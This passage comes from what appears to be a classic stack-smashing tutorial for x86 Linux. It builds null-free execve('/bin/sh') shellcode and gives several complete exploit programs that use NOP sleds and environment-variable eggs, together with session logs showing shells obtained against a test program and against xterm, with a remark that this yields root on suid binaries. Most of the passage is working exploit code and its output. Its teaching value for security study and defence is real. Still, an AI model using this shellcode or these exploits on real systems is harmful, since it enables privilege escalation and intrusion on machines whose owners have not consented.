code we wish to execute in the stack or data segment, and transfer control
to it.  To do so we will place our code in a global array in the data
segment.  We need first a hex representation of the binary code. Lets
compile it first, and then use gdb to obtain it.

shellcodeasm.c
------------------------------------------------------------------------------
void main() {
__asm__(&quot;
        jmp    0x2a                     # 3 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        movb   $0x0,0x7(%esi)           # 4 bytes
        movl   $0x0,0xc(%esi)           # 7 bytes
        movl   $0xb,%eax                # 5 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        movl   $0x1, %eax               # 5 bytes
        movl   $0x0, %ebx               # 5 bytes
        int    $0x80                    # 2 bytes
        call   -0x2f                    # 5 bytes
        .string \&quot;/bin/sh\&quot;             # 8 bytes
&quot;);
}
------------------------------------------------------------------------------

------------------------------------------------------------------------------
[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
[aleph1]$ gdb shellcodeasm
GDB is free software and you are welcome to distribute copies of it
 under certain conditions; type &quot;show copying&quot; to see the conditions.
There is absolutely no warranty for GDB; type &quot;show warranty&quot; for details.
GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
(gdb) disassemble main
Dump of assembler code for function main:
0x8000130 &lt;main&gt;:       pushl  %ebp
0x8000131 &lt;main+1&gt;:     movl   %esp,%ebp
0x8000133 &lt;main+3&gt;:     jmp    0x800015f &lt;main+47&gt;
0x8000135 &lt;main+5&gt;:     popl   %esi
0x8000136 &lt;main+6&gt;:     movl   %esi,0x8(%esi)
0x8000139 &lt;main+9&gt;:     movb   $0x0,0x7(%esi)
0x800013d &lt;main+13&gt;:    movl   $0x0,0xc(%esi)
0x8000144 &lt;main+20&gt;:    movl   $0xb,%eax
0x8000149 &lt;main+25&gt;:    movl   %esi,%ebx
0x800014b &lt;main+27&gt;:    leal   0x8(%esi),%ecx
0x800014e &lt;main+30&gt;:    leal   0xc(%esi),%edx
0x8000151 &lt;main+33&gt;:    int    $0x80
0x8000153 &lt;main+35&gt;:    movl   $0x1,%eax
0x8000158 &lt;main+40&gt;:    movl   $0x0,%ebx
0x800015d &lt;main+45&gt;:    int    $0x80
0x800015f &lt;main+47&gt;:    call   0x8000135 &lt;main+5&gt;
0x8000164 &lt;main+52&gt;:    das
0x8000165 &lt;main+53&gt;:    boundl 0x6e(%ecx),%ebp
0x8000168 &lt;main+56&gt;:    das
0x8000169 &lt;main+57&gt;:    jae    0x80001d3 &lt;__new_exitfn+55&gt;
0x800016b &lt;main+59&gt;:    addb   %cl,0x55c35dec(%ecx)
End of assembler dump.
(gdb) x/bx main+3
0x8000133 &lt;main+3&gt;:     0xeb
(gdb)
0x8000134 &lt;main+4&gt;:     0x2a
(gdb)
.
.
.
------------------------------------------------------------------------------

testsc.c
------------------------------------------------------------------------------
char shellcode[] =
    &quot;\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00&quot;
    &quot;\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80&quot;
    &quot;\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff&quot;
    &quot;\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3&quot;;

void main() {
   int *ret;

   ret = (int *)&amp;ret + 2;
   (*ret) = (int)shellcode;

}
------------------------------------------------------------------------------
------------------------------------------------------------------------------
[aleph1]$ gcc -o testsc testsc.c
[aleph1]$ ./testsc
$ exit
[aleph1]$
------------------------------------------------------------------------------

   It works! But there is an obstacle.  In most cases we'll be trying to
overflow a character buffer.  As such any null bytes in our shellcode will be
considered the end of the string, and the copy will be terminated.  There must
be no null bytes in the shellcode for the exploit to work.  Let's try to
eliminate the bytes (and at the same time make it smaller).

           Problem instruction:                 Substitute with:
           --------------------------------------------------------
           movb   $0x0,0x7(%esi)                xorl   %eax,%eax
       molv   $0x0,0xc(%esi)                movb   %eax,0x7(%esi)
                                                movl   %eax,0xc(%esi)
           --------------------------------------------------------
           movl   $0xb,%eax                     movb   $0xb,%al
           --------------------------------------------------------
           movl   $0x1, %eax                    xorl   %ebx,%ebx
           movl   $0x0, %ebx                    movl   %ebx,%eax
                                                inc    %eax
           --------------------------------------------------------

   Our improved code:

shellcodeasm2.c
------------------------------------------------------------------------------
void main() {
__asm__(&quot;
        jmp    0x1f                     # 2 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        xorl   %eax,%eax                # 2 bytes
    movb   %eax,0x7(%esi)       # 3 bytes
        movl   %eax,0xc(%esi)           # 3 bytes
        movb   $0xb,%al                 # 2 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        xorl   %ebx,%ebx                # 2 bytes
        movl   %ebx,%eax                # 2 bytes
        inc    %eax                     # 1 bytes
        int    $0x80                    # 2 bytes
        call   -0x24                    # 5 bytes
        .string \&quot;/bin/sh\&quot;             # 8 bytes
                    # 46 bytes total
&quot;);
}
------------------------------------------------------------------------------

   And our new test program:

testsc2.c
------------------------------------------------------------------------------
char shellcode[] =
    &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
    &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
    &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

void main() {
   int *ret;

   ret = (int *)&amp;ret + 2;
   (*ret) = (int)shellcode;

}
------------------------------------------------------------------------------
------------------------------------------------------------------------------
[aleph1]$ gcc -o testsc2 testsc2.c
[aleph1]$ ./testsc2
$ exit
[aleph1]$
------------------------------------------------------------------------------


                              Writing an Exploit
                              ~~~~~~~~~~~~~~~~~~
                          (or how to mung the stack)
                          ~~~~~~~~~~~~~~~~~~~~~~~~~~


   Lets try to pull all our pieces together.  We have the shellcode.  We know
it must be part of the string which we'll use to overflow the buffer.  We 
know we must point the return address back into the buffer.  This example will
demonstrate these points:

overflow1.c
------------------------------------------------------------------------------
char shellcode[] =
        &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
        &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
        &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

char large_string[128];

void main() {
  char buffer[96];
  int i;
  long *long_ptr = (long *) large_string;

  for (i = 0; i &lt; 32; i++)
    *(long_ptr + i) = (int) buffer;

  for (i = 0; i &lt; strlen(shellcode); i++)
    large_string[i] = shellcode[i];

  strcpy(buffer,large_string);
}
------------------------------------------------------------------------------

------------------------------------------------------------------------------
[aleph1]$ gcc -o exploit1 exploit1.c
[aleph1]$ ./exploit1
$ exit
exit
[aleph1]$
------------------------------------------------------------------------------

   What we have done above is filled the array large_string[] with the
address of buffer[], which is where our code will be.  Then we copy our
shellcode into the beginning of the large_string string.  strcpy() will then
copy large_string onto buffer without doing any bounds checking, and will
overflow the return address, overwriting it with the address where our code
is now located.  Once we reach the end of main and it tried to return it
jumps to our code, and execs a shell.

   The problem we are faced when trying to overflow the buffer of another
program is trying to figure out at what address the buffer (and thus our
code) will be.  The answer is that for every program the stack will
start at the same address.  Most programs do not push more than a few hundred
or a few thousand bytes into the stack at any one time.  Therefore by knowing
where the stack starts we can try to guess where the buffer we are trying to
overflow will be.  Here is a little program that will print its stack
pointer:

sp.c
------------------------------------------------------------------------------
unsigned long get_sp(void) {
   __asm__(&quot;movl %esp,%eax&quot;);
}
void main() {
  printf(&quot;0x%x\n&quot;, get_sp());
}
------------------------------------------------------------------------------

------------------------------------------------------------------------------
[aleph1]$ ./sp
0x8000470
[aleph1]$
------------------------------------------------------------------------------

   Lets assume this is the program we are trying to overflow is:

vulnerable.c
------------------------------------------------------------------------------
void main(int argc, char *argv[]) {
  char buffer[512];

  if (argc &gt; 1)
    strcpy(buffer,argv[1]);
}
------------------------------------------------------------------------------

   We can create a program that takes as a parameter a buffer size, and an
offset from its own stack pointer (where we believe the buffer we want to
overflow may live).  We'll put the overflow string in an environment variable
so it is easy to manipulate:

exploit2.c
------------------------------------------------------------------------------
#include &lt;stdlib.h&gt;

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512

char shellcode[] =
  &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
  &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
  &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

unsigned long get_sp(void) {
   __asm__(&quot;movl %esp,%eax&quot;);
}

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  if (argc &gt; 1) bsize  = atoi(argv[1]);
  if (argc &gt; 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
    printf(&quot;Can't allocate memory.\n&quot;);
    exit(0);
  }

  addr = get_sp() - offset;
  printf(&quot;Using address: 0x%x\n&quot;, addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i &lt; bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr += 4;
  for (i = 0; i &lt; strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  memcpy(buff,&quot;EGG=&quot;,4);
  putenv(buff);
  system(&quot;/bin/bash&quot;);
}
------------------------------------------------------------------------------

   Now we can try to guess what the buffer and offset should be:

------------------------------------------------------------------------------
[aleph1]$ ./exploit2 500
Using address: 0xbffffdb4
[aleph1]$ ./vulnerable $EGG
[aleph1]$ exit
[aleph1]$ ./exploit2 600
Using address: 0xbffffdb4
[aleph1]$ ./vulnerable $EGG
Illegal instruction
[aleph1]$ exit
[aleph1]$ ./exploit2 600 100
Using address: 0xbffffd4c
[aleph1]$ ./vulnerable $EGG
Segmentation fault
[aleph1]$ exit
[aleph1]$ ./exploit2 600 200
Using address: 0xbffffce8
[aleph1]$ ./vulnerable $EGG
Segmentation fault
[aleph1]$ exit
.
.
.
[aleph1]$ ./exploit2 600 1564
Using address: 0xbffff794
[aleph1]$ ./vulnerable $EGG
$
------------------------------------------------------------------------------

   As we can see this is not an efficient process.  Trying to guess the
offset even while knowing where the beginning of the stack lives is nearly
impossible.  We would need at best a hundred tries, and at worst a couple of
thousand.  The problem is we need to guess *exactly* where the address of our 
code will start.  If we are off by one byte more or less we will just get a
segmentation violation or a invalid instruction.  One way to increase our
chances is to pad the front of our overflow buffer with NOP instructions.
Almost all processors have a NOP instruction that performs a null operation.
It is usually used to delay execution for purposes of timing.  We will take
advantage of it and fill half of our overflow buffer with them.  We will place
our shellcode at the center, and then follow it with the return addresses. If
we are lucky and the return address points anywhere in the string of NOPs,
they will just get executed until they reach our code.  In the Intel
architecture the NOP instruction is one byte long and it translates to 0x90
in machine code.  Assuming the stack starts at address 0xFF, that S stands for
shell code, and that N stands for a NOP instruction the new stack would look
like this:

bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
           buffer                sfp   ret   a     b     c

&lt;------   [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]
                 ^                     |
                 |_____________________|
top of                                                            bottom of
stack                                                                 stack

   The new exploits is then:

exploit3.c
------------------------------------------------------------------------------
#include &lt;stdlib.h&gt;

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define NOP                            0x90

char shellcode[] =
  &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
  &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
  &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

unsigned long get_sp(void) {
   __asm__(&quot;movl %esp,%eax&quot;);
}

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  if (argc &gt; 1) bsize  = atoi(argv[1]);
  if (argc &gt; 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
    printf(&quot;Can't allocate memory.\n&quot;);
    exit(0);
  }

  addr = get_sp() - offset;
  printf(&quot;Using address: 0x%x\n&quot;, addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i &lt; bsize; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i &lt; bsize/2; i++)
    buff[i] = NOP;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i &lt; strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  memcpy(buff,&quot;EGG=&quot;,4);
  putenv(buff);
  system(&quot;/bin/bash&quot;);
}
------------------------------------------------------------------------------

   A good selection for our buffer size is about 100 bytes more than the size
of the buffer we are trying to overflow.  This will place our code at the end
of the buffer we are trying to overflow, giving a lot of space for the NOPs,
but still overwriting the return address with the address we guessed.  The
buffer we are trying to overflow is 512 bytes long, so we'll use 612.  Let's
try to overflow our test program with our new exploit:

------------------------------------------------------------------------------
[aleph1]$ ./exploit3 612
Using address: 0xbffffdb4
[aleph1]$ ./vulnerable $EGG
$
------------------------------------------------------------------------------

   Whoa!  First try!  This change has improved our chances a hundredfold. 
Let's try it now on a real case of a buffer overflow.  We'll use for our
demonstration the buffer overflow on the Xt library.  For our example, we'll 
use xterm (all programs linked with the Xt library are vulnerable). You must
be running an X server and allow connections to it from the localhost.  Set
your DISPLAY variable accordingly.

------------------------------------------------------------------------------
[aleph1]$ export DISPLAY=:0.0
[aleph1]$ ./exploit3 1124
Using address: 0xbffffdb4
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
Warning: Color name &quot;ë^1¤FF
                           °
                            óV

¤1¤Ø@¤èÜÿÿÿ/bin/sh¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤








ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤








¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤
^C
[aleph1]$ exit
[aleph1]$ ./exploit3 2148 100
Using address: 0xbffffd48
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
Warning: Color name &quot;ë^1¤FF
                           °
                            óV

¤1¤Ø@¤èÜÿÿÿ/bin/sh¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤








ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H








¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿








H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ








¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ¿H¤ÿ
Warning: some arguments in previous message were lost
Illegal instruction
[aleph1]$ exit
.
.
.
[aleph1]$ ./exploit4 2148 600
Using address: 0xbffffb54
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
Warning: Color name &quot;ë^1¤FF
                           °
                            óV

¤1¤Ø@¤èÜÿÿÿ/bin/shûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tû








ÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿T








ûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿








Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ








¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ¿Tûÿ
Warning: some arguments in previous message were lost
bash$
------------------------------------------------------------------------------

   Eureka! Less than a dozen tries and we found the magic numbers. If xterm
where installed suid root this would now be a root shell.


                            Small Buffer Overflows
                            ~~~~~~~~~~~~~~~~~~~~~~

   There will be times when the buffer you are trying to overflow is so
small that either the shellcode wont fit into it, and it will overwrite the
return address with instructions instead of the address of our code, or the
number of NOPs you can pad the front of the string with is so small that the
chances of guessing their address is minuscule.  To obtain a shell from these
programs we will have to go about it another way.  This particular approach
only works when you have access to the program's environment variables.

   What we will do is place our shellcode in an environment variable, and
then overflow the buffer with the address of this variable in memory.  This
method also increases your changes of the exploit working as you can make
the environment variable holding the shell code as large as you want.

   The environment variables are stored in the top of the stack when the
program is started, any modification by setenv() are then allocated
elsewhere.  The stack at the beginning then looks like this:


      &lt;strings&gt;&lt;argv pointers&gt;NULL&lt;envp pointers&gt;NULL&lt;argc&gt;&lt;argv&gt;&lt;envp&gt;

   Our new program will take an extra variable, the size of the variable
containing the shellcode and NOPs. Our new exploit now looks like this:

exploit4.c
------------------------------------------------------------------------------
#include &lt;stdlib.h&gt;

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90

char shellcode[] =
  &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
  &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
  &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

unsigned long get_esp(void) {
   __asm__(&quot;movl %esp,%eax&quot;);
}

void main(int argc, char *argv[]) {
  char *buff, *ptr, *egg;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, eggsize=DEFAULT_EGG_SIZE;

  if (argc &gt; 1) bsize   = atoi(argv[1]);
  if (argc &gt; 2) offset  = atoi(argv[2]);
  if (argc &gt; 3) eggsize = atoi(argv[3]);


  if (!(buff = malloc(bsize))) {
    printf(&quot;Can't allocate memory.\n&quot;);
    exit(0);
  }
  if (!(egg = malloc(eggsize))) {
    printf(&quot;Can't allocate memory.\n&quot;);
    exit(0);
  }

  addr = get_esp() - offset;
  printf(&quot;Using address: 0x%x\n&quot;, addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i &lt; bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr = egg;
  for (i = 0; i &lt; eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;

  for (i = 0; i &lt; strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';

  memcpy(egg,&quot;EGG=&quot;,4);
  putenv(egg);
  memcpy(buff,&quot;RET=&quot;,4);
  putenv(buff);
  system(&quot;/bin/bash&quot;);
}
